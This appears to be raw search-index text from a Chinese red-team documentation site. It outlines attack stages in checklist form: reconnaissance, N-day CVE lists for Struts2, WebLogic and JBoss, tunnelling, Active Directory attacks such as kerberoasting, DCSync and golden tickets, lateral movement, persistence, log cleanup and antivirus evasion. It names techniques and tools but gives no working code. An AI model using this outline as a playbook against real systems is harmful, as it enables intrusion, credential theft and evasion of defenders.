\u63d0\u70bc\u6c47\u603b \uff0c\u9632\u5fa1\u91cd\u70b9 ] \u00b6 \u51fa\u7f51\u6d41\u91cf\u523a\u63a2 \u6bd4\u5982,http,dns,\u4ee5\u53ca\u4e00\u4e9b\u7a7f\u900f\u6027\u76f8\u5bf9\u8f83\u597d\u7684tcp\u7aef\u53e3... \u8fd9\u79cd\u64cd\u4f5c\u4e00\u822c\u90fd\u4f1a\u914d\u5408wmi,smb,ssh\u8fdc\u7a0b\u6267\u884c,\u5728\u5185\u7f51\u6279\u91cf\u5feb\u901f\u8bc6\u522b\u51fa\u80fd\u51fa\u7f51\u7684\u673a\u5668 \u5e38\u89c4 HTTP\u811a\u672c\u4ee3\u7406 abptts,Neo-reGeorg,reGeorg,tunna,reduh... \u4e0d\u5f97\u4e0d\u8bf4,\u516c\u5f00\u811a\u672c\u5728\u5b9e\u6218\u4e2d\u591a\u591a\u5c11\u5c11\u90fd\u4f1a\u6709\u4e9b\u95ee\u9898,\u8fd8\u9700\u8981\u6839\u636e\u81ea\u5df1\u7684\u5b9e\u9645\u76ee\u6807\u73af\u5883\u6df1\u5ea6\u6539\u8fdb\u624d\u884c SSH \u96a7\u9053 \u52a0\u5bc6\u7aef\u53e3\u8f6c\u53d1,socks \u5b9e\u6218\u7528\u9014\u975e\u5e38\u7075\u6d3b,\u6b64\u5904\u4e0d\u7ec6\u8bf4 ] Rdp \u96a7\u9053 \u53cd\u5411SOCKS nps, frp, ssf, CobaltStrike(socks4a & rportfwd ), sscoks ... \u5de5\u5177\u57fa\u672c\u90fd\u4e0d\u514d\u6740\u4e86,\u9700\u8981\u81ea\u884c\u5904\u7406 \u6b63\u53cd\u5411TCP \u7aef\u53e3\u8f6c\u53d1 \u975e\u5e38\u591a,\u5c31\u4e0d\u4e00\u4e00\u5217\u4e3e, eg: nginx,netsh,socat,ew.... DNS\u52a0\u5bc6\u96a7\u9053 Web\u7aef\u53e3\u590d\u7528 \u9700\u8981\u660e\u767d\u7684\u662f,\u5728\u4e00\u822c\u7684\u7ea2\u961f\u573a\u666f\u4e2d \u5165\u4fb5\u8005\u4e3a\u4e86\u5c3d\u53ef\u80fd\u8eb2\u907f\u5404\u79cd\u68c0\u6d4b\u8bbe\u5907\u7684\u6d41\u91cf\u89e3\u6790,\u5f88\u591a\u6b64\u7c7b\u5de5\u5177\u90fd\u4f1a\u91c7\u7528\u5404\u79cd\u5404\u6837\u7684\u65b9\u5f0f\u6765\u52a0\u5bc6\u4f20\u8f93\u6d41\u91cf,\u4ee5\u6b64\u6765\u4fdd\u8bc1\u81ea\u5df1\u6709\u66f4\u5f3a\u7684\u7a7f\u900f\u6027 0x09 \u57df\u5185\u7f51\u5b89\u5168 [ \u57df\u5185\u5e38\u7528\u653b\u51fb\u624b\u6cd5 ( \u57df\u6e17\u900f )\uff0c\u63d0\u70bc\u6c47\u603b\uff0c\u9632\u5fa1\u91cd\u70b9 ] \u00b6 \u9488\u5bf9\u5f53\u524d\u57df\u7684\u4e00\u4e9b\u5e38\u89c4\u4fe1\u606f\u641c\u96c6[ \u5176\u5b9e\u73b0\u5b9e\u4e2d,\u53ea\u9700\u8981\u4e00\u4e2aBloodHound & Pingcastle\u8db3\u77e3,\u5c31\u662f\u5de5\u5177\u9700\u8981\u81ea\u884c\u4e8b\u5148\u514d\u6740\u597d] \u83b7\u53d6\u5f53\u524d\u57df\u5185\u7684\u5b8c\u6574\u57df\u7ba1\u5217\u8868 \u83b7\u53d6\u5f53\u524d\u57df\u5185\u7684\u6240\u6709\u57df\u63a7\u673a\u5668\u540d\u5217\u8868 \u83b7\u53d6\u5f53\u524d\u57df\u5185\u7684\u6240\u6709DNS\u670d\u52a1\u5668\u673a\u5668\u540d\u5217\u8868 \u83b7\u53d6\u5f53\u524d\u57df\u5185\u7684\u6240\u6709SPN \u83b7\u53d6\u5f53\u524d\u57df\u5185\u7684\u6240\u6709OU \u83b7\u53d6\u5f53\u524d\u57df\u5185\u7684\u6240\u6709\u7528\u6237 & \u7528\u6237\u7ec4\u5217\u8868 \u83b7\u53d6\u5f53\u524d\u57df\u4fe1\u4efb\u5173\u7cfb [ \u8de8\u57df\u6e17\u900f ] \u83b7\u53d6\u5f53\u524d\u57df\u5185\u6240\u6709\u673a\u5668\u7684\u5f00\u673a\u65f6\u95f4 \u83b7\u53d6\u5f53\u524d\u57df\u5185\u7f51\u6bb5\u53caweb\u7ad9\u70b9 \u83b7\u53d6\u5f53\u524d\u57df\u5185\u7b56\u7565 [ \u4e3b\u8981\u662f\u4e3a\u4e86\u4e86\u89e3\u5bc6\u7801\u7b56\u7565 ] \u83b7\u53d6\u5f53\u524d\u57df\u6797 ....... \u5feb\u901f\u83b7\u53d6\u76ee\u6807\u57df\u63a7\u6743\u9650\u7684\u4e00\u4e9b\u5e38\u89c4\u624b\u6cd5 \u641c\u96c6GPP \u76ee\u5f55 [ \u5176\u4e2d\u53ef\u80fd\u4fdd\u5b58\u7684\u6709\u57df\u8d26\u53f7\u5bc6\u7801,\u4e0d\u4ec5\u4ec5\u662f\u5b58\u5728XML\u91cc\u7684\u90a3\u4e9b,NETLOGON\u76ee\u5f55\u4e2d\u7684\u67d0\u4e9b\u811a\u672c\u540c\u6837\u4e5f\u53ef\u80fd\u4fdd\u5b58\u6709\u8d26\u53f7\u5bc6\u7801 ] \u670d\u52a1\u7968\u636ehash\u7834\u89e3(\"\u5c24\u5176\u662f\u57df\u7ba1\u7528\u6237\u7684\") [ kerberoast ] \u6279\u91cf\u5bf9\u57df\u7528\u6237\u8fdb\u884c\u5355\u5bc6\u7801\u5c1d\u8bd5 [ \u55b7\u5c04,\u5229\u7528ADSI\u63a5\u53e3,\u65e5\u5fd7id 4771 ] Kerberos \u59d4\u6d3e\u5229\u7528 \u7206\u7834LDAP Exchange\u7279\u5b9aACL\u6ee5\u7528 SSP \u622a\u83b7\u5173\u952e\u670d\u52a1\u5668\u767b\u5f55\u5bc6\u7801 \u5229\u7528\u5404\u7c7b\u57fa\u7840\u670d\u52a1\u5728\u5185\u7f51\u5feb\u901f getshell [ \u5f31\u53e3\u4ee4, \u5404\u7c7bJAVA\u4e2d\u95f4\u4ef6\u5df2\u77e5Nday\u6f0f\u6d1e, \u5e38\u89c4Web\u6f0f\u6d1e... ],\u5728\u5185\u7f51\u5faa\u73af\u6293\u5404\u7c7b\u5bc6\u7801,\u76f4\u81f3 \u6293\u5230\u57df\u7ba1\u5bc6\u7801 \u6293\u5230\u57df\u7ba1\u4ee4\u724c DNSAdmin \u7ec4\u6210\u5458\u6ee5\u7528 [ \u52a0\u8f7d\u6267\u884c\u6076\u610fdll ] LAPS MS14-068 [ \u5982\u4eca\u5b9e\u9645\u4e2d\u5df2\u5f88\u5c11\u9047\u5230\u4e86 ] LLMNR/NBNS\u6b3a\u9a97 + SMB relay [ \u771f\u5b9e\u5728\u5b9e\u6218\u4e2d\u5176\u5b9e\u7528\u7684\u5e76\u4e0d\u591a ] \u57df\u5185\u540e\u6e17\u900f\u654f\u611f\u4fe1\u606f\u641c\u96c6\u5206\u6790 \u83b7\u53d6\u6240\u6709DNS\u8bb0\u5f55 \u5bfc\u51fa\u5f53\u524d\u57df\u7684\u5b8c\u6574LDAP\u6570\u636e\u5e93 \u63d0\u53d6\u5f53\u524d\u57df\u7684ntds.dit [ \u57df\u5185\u8d26\u53f7\u5bc6\u7801\u6570\u636e\u5e93 ] Dcsync\u540c\u6b65 Volume Shadow Copy Service \u57df\u5185\u6307\u5b9a\u7528\u6237\u767b\u5f55ip\u5b9a\u4f4d \u5229\u7528OWA\u767b\u5f55\u65e5\u5fd7 \u5229\u7528\u57df\u63a7\u670d\u52a1\u5668\u767b\u5f55\u65e5\u5fd7 \u6307\u5b9a\u670d\u52a1\u94f6\u7968 [ Silver Ticket ] \u9664\u6b64\u4e4b\u5916,\u5c31\u662f\u4e0b\u9762\u7684\u5404\u7c7b\u5e38\u89c4\u6a2a\u5411\u624b\u6cd5 \u57df\u5185\u6307\u5b9a\u7528\u6237\u673a\u5668\u5b9a\u5411\u63a7\u5236\u6280\u5de7 \u7ed1\u5b9a\u7528\u6237\u767b\u5f55\u811a\u672c \u5229\u7528GPO\u4e0b\u53d1 [\u5b9e\u9645\u4e0a,\u5229\u7528GPO\u80fd\u505a\u7684\u4e8b\u60c5\u8fd8\u975e\u5e38\u975e\u5e38\u591a] PTT [ \u7968\u636e\u4f20\u9012 ] \u9488\u5bf9\u57df\u7ba1\u7684\u5404\u79cd\u6743\u9650\u7ef4\u6301\u6280\u5de7 \u91d1\u7968 Skeleton Key DSRM\u5bc6\u7801\u540c\u6b65 OWA\u540e\u95e8 ... \u57df\u5185Exchange \u90ae\u4ef6\u6570\u636e\u8131\u53d6 \u5229\u7528Ews\u63a5\u53e3\u901a\u8fc7PTH\u7684\u65b9\u5f0f\u8131\u90ae\u4ef6 0x10 \u5185\u7f51\u5b89\u5168 [ \u8de8\u5e73\u53f0\u6a2a\u5411\u6e17\u900f (\u8fdc\u7a0b\u6267\u884c)\uff0c\u9632\u5fa1\u91cd\u70b9 ( \"\u91cd\u4e2d\u4e4b\u91cd\" ) ] \u00b6 \u4ece Windows\u5e73\u53f0 \u6a2a\u5411\u81f3 Windows\u5e73\u53f0 \u6ce8: \u4ee5\u4e0b\u67d0\u4e9b\u8fdc\u7a0b\u6267\u884c\u65b9\u5f0f, \u5373\u53ef\u76f4\u63a5\u7528\u660e\u6587\u8d26\u53f7\u5bc6\u7801 \u4ea6\u53ef \u57fa\u4e8epth\u6765\u8fdb\u884c, \u4e0d\u5c40\u9650 \u8fdc\u7a0b\u670d\u52a1\u7ba1\u7406 [ SCM ] \u8fdc\u7a0b\u521b\u5efa\u6267\u884c\u8ba1\u5212\u4efb\u52a1 [ Scheduled Tasks ] WMI \u8fdc\u7a0b\u6267\u884c [ WMI ] \u9488\u5bf9\u9ad8\u7248\u672cWindows \u7684WinRM \u8fdc\u7a0b\u6267\u884c DCOM \u8fdc\u7a0b\u6267\u884c [ \u9700\u8981\u76ee\u6807Windows\u673a\u5668\u4e8b\u5148\u5df2\u5173\u95ed\u9632\u706b\u5899 ] \u9ad8\u7248\u672c RDP \u8fdc\u7a0b\u6267\u884c \u5229\u7528MSSQL\u6570\u636e\u5e93\u5b58\u50a8\u8fc7\u7a0b\u6765\u53d8\u76f8\u8fdc\u7a0b\u6267\u884c \u5229\u7528Oracle\u6570\u636e\u5e93\u5b58\u50a8\u8fc7\u7a0b\u6765\u53d8\u76f8\u8fdc\u7a0b\u6267\u884c SMB [ PTH (hash\u4f20\u9012) ] RDP[MSTSC] \u53cd\u5411\u6e17\u900f [ \u5373\u53ef\u7528\u4e8e\u7a81\u7834\u67d0\u4e9b\u9694\u79bb, \u4ea6\u53ef\u901a\u8fc7\u4e91(Windows vps)\u76f4\u63a5\u53cd\u63a7\u76ee\u6807\u7ba1\u7406\u5458\u4e2a\u4eba\u673a CVE-2019-0887 ] \u5229\u7528\u8865\u4e01\u670d\u52a1\u5668\u4e0b\u53d1\u6267\u884c \u5229\u7528EDR\u4e3b\u63a7\u7aef\u5b9a\u5411\u4e0b\u53d1\u6267\u884c \u4ece Windows\u5e73\u53f0 \u6a2a\u5411\u81f3 *inux\u5e73\u53f0 plink \u6216\u8005 \u57fa\u4e8eWindows SSH\u5e93\u81ea\u884c\u5f00\u53d1\u5404\u79cd\u8fdc\u7a0b\u6267\u884c\u5c0f\u5de5\u5177 \u4ece *inux\u5e73\u53f0 \u6a2a\u5411\u81f3 Windows \u5e73\u53f0 \u4e00\u822c\u90fd\u4f1a\u5c06 impacket\u5957\u4ef6\u4e2d\u7684\u5404\u4e2a\u5e38\u7528py\u811a\u672c\u4e8b\u5148\u76f4\u63a5\u6253\u5305\u6210\u53ef\u6267\u884c\u6587\u4ef6, \u7136\u540e\u4e22\u5230\u76ee\u6807linux\u7cfb\u7edf\u4e2d\u53bb\u6267\u884c,\u5982\u4e0b wmiexec_linux_x86_64 smbexec_linux_x86_64 psexec_linux_x86_64 atexec_linux_x86_64 dcomexec_linux_x86_64 \u53e6\u5916,\u8fd8\u6709\u4e00\u4e9b\u57fa\u4e8ego\u7684\u5de5\u5177,\u540c\u6837\u4e5f\u53ef\u4ee5\u7f16\u8bd1\u6210\u53ef\u6267\u884c\u6587\u4ef6\u4e4b\u540e\u518d\u4e22\u4e0a\u53bb\u6267\u884c \u4ece *inux\u5e73\u53f0 \u6a2a\u5411\u81f3 *inux \u5e73\u53f0 linux \u81ea\u5e26\u7684ssh\u5ba2\u6237\u7aef\u5de5\u5177\u5957\u4ef6, \u9ed8\u8ba4\u5c31\u53ef\u4ee5\u7528\u6765\u8fdb\u884c\u8fdc\u7a0b\u6267\u884c \u5404\u79cd\u8fdc\u7a0b\u4e0b\u8f7d\u6280\u5de7 wget [ win & linux ] curl [ win & linux ] \u4e4b\u6240\u4ee5\u6ca1\u7740\u91cd\u63d0\u4ee5\u4e0b\u8fd9\u4e9b\u7cfb\u7edf\u5185\u7f6e\u7684\u8fdc\u7a0b\u4e0b\u8f7d\u6267\u884c\u5de5\u5177,\u4e3b\u8981\u8fd8\u662f\u56e0\u4e3a\u4e8b\u5148\u5df2\u7ecf\u660e\u786e\u77e5\u9053 \u67d0\u4e9b\u6740\u8f6f\u73af\u5883\u4e0b\u5b83\u80af\u5b9a\u4f1a\u88ab\u62e6\u622a,\u6240\u4ee5\u4e8b\u5148\u5c31\u76f4\u63a5\u628a\u5b83\u5f03\u7528\u4e86,\u5c24\u5176\u9488\u5bf9\u7ea2\u961f\u8fd9\u79cd\u573a\u666f,\u8fd9\u4e9b\u4e1c\u897f\u6839\u672c\u4e0d\u5728\u4e4e\u591a,\u6709\u4e00\u4e2a\u80fd\u7528\u597d\u7528\u7684\u5373\u53ef CertUtil.exe Bitsadmin.exe Regsvr32.exe Rundll32.exe Powershell.exe ...... 0x11 \u5185\u7f51\u5b89\u5168 [ \u6743\u9650\u7ef4\u6301\uff0c\u9632\u5fa1\u91cd\u70b9 ] [ \u6ce8: \u6709\u4e9b\u7ec6\u8282\u6b64\u5904\u5e76\u672a\u5c55\u5f00\u8be6\u7ec6\u8bf4\u660e ] \u00b6 \u8fb9\u754c\u5165\u53e3\u6743\u9650\u7ef4\u6301 OWA \u767b\u5f55\u53e3 [ \u8d26\u53f7\u5bc6\u7801,webshell ] VPN \u767b\u5f55\u53e3 [ \u8d26\u53f7\u5bc6\u7801,shell ] \u5176\u4ed6 MAIL \u767b\u5f55\u53e3 [ \u8d26\u53f7\u5bc6\u7801 ] \u8fb9\u754c Web\u670d\u52a1\u5668 [ Webshell \u9a7b\u7559\u6280\u5de7 ] \u8fb9\u754c\u8def\u7531\u4ea4\u6362\u8bbe\u5907 [ \u8d26\u53f7\u5bc6\u7801,shell ] ... Windows \u5355\u673a\u7cfb\u7edf\u7ef4\u6301 [\u4e34\u65f6] \u7cfb\u7edf\u8ba1\u5212\u4efb\u52a1 [ \u9ad8\u6743\u9650/\u4f4e\u6743\u9650 ] \u5e38\u89c4\u6ce8\u518c\u8868\u81ea\u542f\u52a8\u9879 [ \u7528\u6237\u6743\u9650/system\u6743\u9650 ] Mssql\u5b58\u50a8\u8fc7\u7a0b [ \u7ee7\u627f\u670d\u52a1\u6743\u9650 ] WMI Winlogon CLR Logon Scripts MruPidlList Mof \u4f20\u7edf\u8fdc\u63a7 ... linux \u5355\u673a\u7cfb\u7edf\u7ef4\u6301 [\u4e34\u65f6] Patch SSH \u66ff\u6362\u5404\u7c7b\u57fa\u7840\u670d\u52a1so [ PAM,Nginx,Rsync ...] \u7cfb\u7edf\u8ba1\u5212\u4efb\u52a1 \u4f20\u7edf\u5e94\u7528\u5c42\u8fdc\u63a7 \u9a71\u52a8\u5c42\u8fdc\u63a7( \u9488\u5bf9\u7279\u5b9a\u5185\u6838\u7248\u672c ) 0x12 \u75d5\u8ff9\u5904\u7406 \u00b6 web\u65e5\u5fd7 [ \u8bbf\u95ee, \u9519\u8bef\u65e5\u5fd7 ] \u6570\u636e\u5e93\u65e5\u5fd7 [ \u5f02\u5e38\u8fde\u63a5\u65e5\u5fd7,\u6162\u67e5\u8be2\u65e5\u5fd7 ] \u7cfb\u7edf\u5404\u7c7b\u5b89\u5168\u65e5\u5fd7 [ ssh,rdp,smb,wmi,powershell....] \u5404\u7c7b\u90ae\u7bb1\u767b\u5f55\u65e5\u5fd7 \u57df\u5185\u654f\u611f\u653b\u51fb\u5229\u7528\u65e5\u5fd7 [ \u91d1\u7968,\u94f6\u7968... ] \u6b64\u9879\u4e3a\u4e13\u4e1a\u84dd\u961f\u8303\u7574,\u4e0d\u518d\u8d58\u8ff0 ...... 0x13 \u5404\u7c7b\u5e38\u7528 C2 / \u6e17\u900f \u6846\u67b6 \u00b6 CobaltStrike [\u4e8c\u6b21\u5f00\u53d1] payload(beacon) \u9006\u5411/\u6539\u8fdb\u91cd\u5199 Metasploit [\u4e8c\u6b21\u5f00\u53d1] ...... 0x14 \u5404\u7c7b\u5e38\u7528 Webshell\u7ba1\u7406\u5de5\u5177 \u00b6 \u83dc\u5200 caidao20160622 \u51b0\u87f9 Behinder_v2.0.1 \u8681\u5251 AntSword ...... 0x15 \u514d\u6740 \u53ca \u5404\u7c7b\u9632\u706b\u5899\u5bf9\u6297 \u00b6 \u9759\u6001 \u6df7\u6dc6: \u624b\u5de5\u6df7\u6dc6,\u6709\u6e90\u7801\u7684\u60c5\u51b5\u4e0b,\u5c1d\u8bd5\u9010\u4e2a\u66ff\u6362\u53ef\u80fd\u662f\u5173\u952e\u7279\u5f81\u5b57\u7b26\u4e32\u7684 \u547d\u540d\u7a7a\u95f4\u540d, \u51fd\u6570\u540d, \u53d8\u91cf\u540d, \u5b57\u7b26\u4e32 \u7b49\u7b49\u7b49.... \u5de5\u5177\u6df7\u6dc6,\u9488\u5bf9\u5404\u79cd\u8bed\u8a00\u7684\u4e13\u4e1a\u6df7\u6dc6\u5de5\u5177 [ \u6709\u5546\u4e1a\u7248 ] ... \u52a0\u58f3: \u4e00\u4e9b\u5e38\u7528\u516c\u5f00\u58f3\u7684\u5b9e\u9645\u6548\u679c\u53ef\u80fd\u5e76\u4e0d\u662f\u592a\u597d [ \u4e5f\u6709\u5546\u4e1a\u58f3 ] \u6700\u597d\u7684\u65b9\u5f0f\u8fd8\u662f\u5c1d\u8bd5\u81ea\u5df1\u5199\u58f3,\u5c31\u662f\u6210\u672c\u8f83\u9ad8 ... \u52a8\u6001 \u53cd\u5c04 shellcode \u5185\u5b58\u52a0\u89e3\u5bc6\u6267\u884c ( \u5bf9\u4e8e\u73b0\u5728\u7684\u67d0\u4e9b\u6740\u8f6f\u6765\u8bb2,\u53ef\u80fd\u5e76\u6ca1\u4ec0\u4e48\u5375\u7528,\u522b\u4eba\u62e6\u7684\u57fa\u672c\u90fd\u662f\u4f60\u7684\u6700\u7ec8\u8c03\u7528 ) \u767d\u5229\u7528 ...... \u6ce8: \u7406\u8bba\u4e0a, \u8fd9\u4e9b\u5e94\u8be5\u4e5f\u6ca1\u6709\u4ec0\u4e48\u975e\u5e38\u901a\u7528\u7684\u65b9\u6cd5 \u5927\u591a\u8fd8\u662f\u4e8b\u5148\u9488\u5bf9\u7279\u5b9a\u7684\u6740\u8f6f\u9488\u5bf9\u6027\u7684\u4e0d\u505c\u8c03\u8bd5\u5206\u6790\u51fa\u5b83\u5230\u5e95\u600e\u4e48\u62e6,\u600e\u4e48\u67e5\u7684,\u7136\u540e\u518d\u9488\u5bf9\u6027\u7684\u5bf9\u75c7\u4e0b\u836f \u6d41\u91cf: \u57df\u524d\u7f6e[\u5229\u7528\u5927\u5382cdn] DNS\u52a0\u5bc6\u96a7\u9053 \u7b2c\u4e09\u65b9\u516c\u5171\u90ae\u7bb1\u4e0a\u7ebf \u7b2c\u4e09\u65b9\u7f51\u76d8\u4e0a\u7ebf \u7b2c\u4e09\u65b9\u793e\u4ea4\u7f51\u7ad9\u4e0a\u7ebf \u7b2c\u4e09\u65b9\u533f\u540d\u793e\u4ea4\u5de5\u5177\u4e0a\u7ebf[eg: tg\u673a\u5668\u4eba,tor...] https://chaceshadow.github.io/","title":"\u76ee\u5f55"},{"location":"redteam/%E7%BA%A2%E9%98%9F%E7%9B%AE%E5%BD%95/#0x01","text":"\u7ed5CDN\u627e\u51fa\u76ee\u6807\u6240\u6709\u771f\u5b9eip\u6bb5 \u627e\u76ee\u6807\u7684\u5404\u79cdWeb\u7ba1\u7406\u540e\u53f0\u767b\u5f55\u53e3 \u6279\u91cf\u6293\u53d6\u76ee\u6807\u6240\u6709\u771f\u5b9eC\u6bb5 Web banner \u6279\u91cf\u5bf9\u76ee\u6807\u6240\u6709\u771f\u5b9eC\u6bb5\u8fdb\u884c\u57fa\u7840\u670d\u52a1\u7aef\u53e3\u626b\u63cf\u63a2\u6d4b\u8bc6\u522b \u5c1d\u8bd5\u76ee\u6807DNS\u662f\u5426\u5141\u8bb8\u533a\u57df\u4f20\u9001,\u5982\u679c\u4e0d\u5141\u8bb8\u5219\u7ee7\u7eed\u5c1d\u8bd5\u5b50\u57df\u7206\u7834 \u6279\u91cf\u6293\u53d6\u76ee\u6807\u6240\u6709\u5b50\u57df Web banner \u6279\u91cf\u5bf9\u76ee\u6807\u6240\u6709\u5b50\u57df\u96c6\u4e2d\u8fdb\u884c\u57fa\u7840\u670d\u52a1\u7aef\u53e3\u63a2\u6d4b\u8bc6\u522b \u6279\u91cf\u8bc6\u522b\u76ee\u6807 \u6240\u6709\u5b58\u6d3bWeb\u7ad9\u70b9\u7684Web\u7a0b\u5e8f\u6307\u7eb9 \u53ca\u5176\u8be6\u7ec6\u7248\u672c \u4ece Git \u4e2d\u67e5\u627e\u76ee\u6807\u6cc4\u9732\u7684\u5404\u7c7b\u654f\u611f\u6587\u4ef6\u53ca\u8d26\u53f7\u5bc6\u7801,\u5076\u5c14\u751a\u81f3\u8fd8\u80fd\u78b0\u5230\u76ee\u6807\u4e0d\u5c0f\u5fc3\u6cc4\u9732\u7684\u5404\u79cd\u4e91\u7684 \"AccessKey\" \u4ece\u7f51\u76d8/\u767e\u5ea6\u6587\u5e93\u4e2d\u67e5\u627e\u76ee\u6807\u6cc4\u9732\u7684\u5404\u7c7b\u654f\u611f\u6587\u4ef6\u53ca\u8d26\u53f7\u5bc6\u7801 \u4ece\u5404\u7b2c\u4e09\u65b9\u5386\u53f2\u6f0f\u6d1e\u5e93\u4e2d\u67e5\u627e\u76ee\u6807\u66fe\u7ecf\u6cc4\u9732\u7684\u5404\u79cd\u654f\u611f\u8d26\u53f7\u5bc6\u7801 [\u56fd\u5185\u76ee\u6807\u5f88\u597d\u4f7f] \u76ee\u6807Svn\u91cc\u6cc4\u9732\u7684\u5404\u7c7b\u654f\u611f\u6587\u4ef6 \u7f51\u7ad9\u76ee\u5f55\u626b\u63cf [\u67e5\u627e\u76ee\u6807\u7f51\u7ad9\u6cc4\u9732\u7684\u5404\u7c7b\u654f\u611f\u6587\u4ef6, \u7f51\u7ad9\u5907\u4efd\u6587\u4ef6,\u654f\u611f\u914d\u7f6e\u6587\u4ef6, \u6e90\u7801 , \u522b\u4eba\u7684webshell, \u7b49\u7b49\u7b49...] \u76ee\u6807\u7ad9\u70b9\u81ea\u8eab\u5728\u524d\u7aef\u4ee3\u7801\u4e2d\u6cc4\u9732\u7684\u5404\u79cd\u654f\u611f\u4fe1\u606f fofa / shodan / bing / google hacking \u6df1\u5ea6\u5229\u7528 \u641c\u96c6\u76ee\u6807\u5b66\u751f\u5b66\u53f7 / \u5458\u5de5\u5de5\u53f7 / \u76ee\u6807\u90ae\u7bb1 [\u5e76\u987a\u624b\u5230\u5404\u4e2a\u793e\u5de5\u5e93\u4e2d\u53bb\u6279\u91cf\u67e5\u8be2\u8fd9\u4e9b\u90ae\u7bb1\u66fe\u7ecf\u662f\u5426\u6cc4\u9732\u8fc7\u5bc6\u7801 ] \u76ee\u6807\u81ea\u5df1\u5bf9\u5916\u63d0\u4f9b\u7684\u5404\u79cd \u6280\u672f\u6587\u6863 / wiki\u91cc\u6cc4\u9732\u7684\u5404\u79cd\u8d26\u53f7\u5bc6\u7801\u53ca\u5176\u5b83\u654f\u611f\u4fe1\u606f \u76ee\u6807\u5fae\u4fe1\u5c0f\u7a0b\u5e8f \u5206\u6790\u76ee\u6807app Web\u8bf7\u6c42 \u501f\u52a9js\u63a2\u9488\u641c\u96c6\u76ee\u6807\u5185\u7f51\u4fe1\u606f \u60f3\u529e\u6cd5\u6df7\u5165\u76ee\u6807\u7684\u5404\u79cd \u5185\u90e8QQ\u7fa4 / \u5fae\u4fe1\u7fa4 \u5206\u6790\u76ee\u6807\u76f4\u63a5\u4f9b\u5e94\u5546 [\u5c24\u5176\u662f\u6280\u672f\u5916\u5305] \u6839\u636e\u524d\u9762\u5df2\u641c\u96c6\u5230\u7684\u5404\u7c7b\u4fe1\u606f\u5236\u4f5c\u6709\u9488\u5bf9\u6027\u7684\u5f31\u53e3\u4ee4\u5b57\u5178 \u76ee\u6807\u6240\u7528 Waf \u79cd\u7c7b\u8bc6\u522b \u4e0e \u7ed5\u8fc7 BypassWAF \u6587\u4ef6\u4e0a\u4f20 / \u8bfb\u53d6 / \u4e0b\u8f7d BypassWAF Sql\u6ce8\u5165 BypassWAF RCE BypassWAF \u5404\u7c7bJava Web\u4e2d\u95f4\u4ef6\u5df2\u77e5Nday\u6f0f\u6d1e\u5229\u7528 BypassWAF Webshell \u514d\u6740","title":"0x01 \u5165\u53e3\u6743\u9650\u83b7\u53d6[\u524d\u671f\u4fa6\u5bdf\uff0c\u641c\u96c6\u9636\u6bb5\u672c\u8eab\u5c31\u4e0d\u5b58\u5728\u592a\u591a\u53ef\u9632\u5fa1\u7684\u70b9\uff0c\u975e\u9632\u5fa1\u91cd\u5fc3]"},{"location":"redteam/%E7%BA%A2%E9%98%9F%E7%9B%AE%E5%BD%95/#0x02","text":"\u6b64\u9636\u6bb5,\u4e3b\u8981\u662f\u9488\u5bf9\u5404\u4e3b\u6d41 \"\u4e2d\u95f4\u4ef6 + \u5f00\u6e90\u7a0b\u5e8f + Web\u670d\u52a1\u7ec4\u4ef6\" \u81ea\u8eab\u7684\u5404\u79cd\u5df2\u77e5Nday\u6f0f\u6d1e\u5229\u7528\u5982\u4e0b\u5df2\u6309 \"\u5b9e\u9645\u653b\u51fb\u5229\u7528\u7684\u96be\u6613\u7a0b\u5ea6\" \u53ca \"\u83b7\u53d6\u5230\u7684shell\u6743\u9650\u9ad8\u4f4e\"\u4e3a\u6807\u51c6\u8fdb\u884c\u4e86\u8be6\u7ec6\u6392\u5e8f,\u7531\u4e8e\u5b8c\u5168\u4ee5\u5b9e\u6218\u5229\u7528\u4e3a\u5bfc\u5411,\u6545\u4ec5\u4ec5\u53ea\u6311\u9009\u4e86\u4e00\u4e9b\u76f8\u5bf9\u4f1a\u7ecf\u5e38\u9047\u5230\u7684,\u4e14\u5b9e\u6218\u4e2d\u786e\u5b9e\u80fd\u6709\u6548\u534f\u52a9\u5feb\u901fgetshell \u7684 \"\u4e2d\u95f4\u4ef6\" , \"\u5f00\u6e90\u7a0b\u5e8f\" \u53ca \"web\u7ec4\u4ef6\" \u9488\u5bf9\u5404\u7c7bJava\u4e2d\u95f4\u4ef6\u7684\u5404\u79cd\u5df2\u77e5Nday\u6f0f\u6d1e\u5229\u7528 \u4e0d\u540c\u4e8e\u5176\u5b83\u811a\u672c\u7c7bweb\u7a0b\u5e8f,Java\u7684\u8fd0\u884c\u6743\u9650\u901a\u5e38\u90fd\u6bd4\u8f83\u9ad8,\u751a\u81f3\u5927\u90e8\u5206\u90fd\u662f\u76f4\u63a5\u7528root/administrator/system\u6743\u9650\u5728\u8dd1,\u6240\u4ee5\u62ff\u5230\u7684shell\u6743\u9650\u4e00\u822c\u4e5f\u975e\u5e38\u9ad8,\u901a\u5e38\u90fd\u76f4\u63a5\u662f\u670d\u52a1\u5668\u6743\u9650,\u5c24\u5176\u662f\u5728\u5404\u79cd\u7ea2\u961f\u573a\u666f\u4e2d,\u5165\u4fb5\u8005\u4e00\u822c\u4e5f\u90fd\u4f1a\u9996\u9009\u8fd9\u4e9b\u70b9,\u5e76\u4ee5\u6b64\u4e3a\u7a81\u7834\u53e3\u6765\u83b7\u53d6\u4e00\u4e2a\u7a33\u5b9a\u7684\u8df3\u677f\u673a\u5165\u53e3\u6743\u9650,\u5173\u4e8e\u5230\u5e95\u54ea\u4e9b\u884c\u4e1a\u7279\u522b\u7231\u7528\u54ea\u4e9b\u4e2d\u95f4\u4ef6,\u8fd9\u4e9b\u4e5f\u5e94\u8be5\u90fd\u662f\u6709\u4e8b\u5148\u5206\u6790\u68b3\u7406\u6c47\u603b\u597d\u7684 Struts2 Struts2-005 Struts2-008 Struts2-009 Struts2-013 Struts2-016(\u5b9e\u9645\u4e0a,\u5f88\u591a\u90fd\u8001\u7cfb\u7edf\u90fd\u6f0f\u8865\u4e86\u8fd9\u4e2a\u6d1e,\u6210\u529f\u7387\u8f83\u9ad8) Struts2-019 Struts2-020 Struts2-devmode Struts2-032 Struts2-033 Struts2-037 Struts2-045 Struts2-046 Struts2-048 Struts2-052 Struts2-053 Struts2-057 weblogic CVE-2019-2725 CVE-2019-2729 CVE-2018-3191 CVE-2018-2628 CVE-2018-2893 CVE-2018-2894 CVE-2017-3506 CVE-2017-10271 CVE-2017-3248 CVE-2016-0638 CVE-2016-3510 CVE-2015-4852 CVE-2014-4210 SSRF \u63a7\u5236\u53f0\u5f31\u53e3\u4ee4,\u90e8\u7f72webshell Jboss CVE-2015-7501 CVE-2017-7504 CVE-2017-12149 \u672a\u6388\u6743\u8bbf\u95ee,\u90e8\u7f72webshell 